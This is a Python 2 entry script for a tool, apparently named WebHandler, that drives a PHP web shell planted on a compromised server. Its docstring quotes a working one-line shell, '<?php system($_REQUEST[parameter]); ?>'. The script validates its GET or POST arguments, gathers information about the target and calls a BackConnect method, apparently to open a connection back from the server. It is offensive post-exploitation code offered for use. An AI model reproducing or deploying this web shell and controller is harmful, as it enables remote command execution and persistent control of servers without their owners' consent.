#!/usr/bin/env python

'''
-*- coding: utf-8 -*-
Copyright 2012 Ahmed Shawky @lnxg33k <ahmed@isecur1ty.org>

Command controller for <?php system($_REQUEST[parameter]); ?>

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.
'''

#importing modules
from core.libs.info import info
from core.libs.executer import commander
from core.libs.menu import getargs, banner

# check for arguments dependencies
if getargs.url:
    if getargs.method == 'post' and not getargs.parameter:
        print '\n[!] Using post method requires --parameter flag, check examples'
        exit(1)
    if getargs.method == 'get' and getargs.parameter:
        print '\n[!] Using get method doesn\'t require --parameter flag, check examples'
        exit(1)
    else:
        print banner                            # get WebHandler banner
        info.get_information()                # call get_information and print info
        commander.BackConnect()                     # call BackConnect method
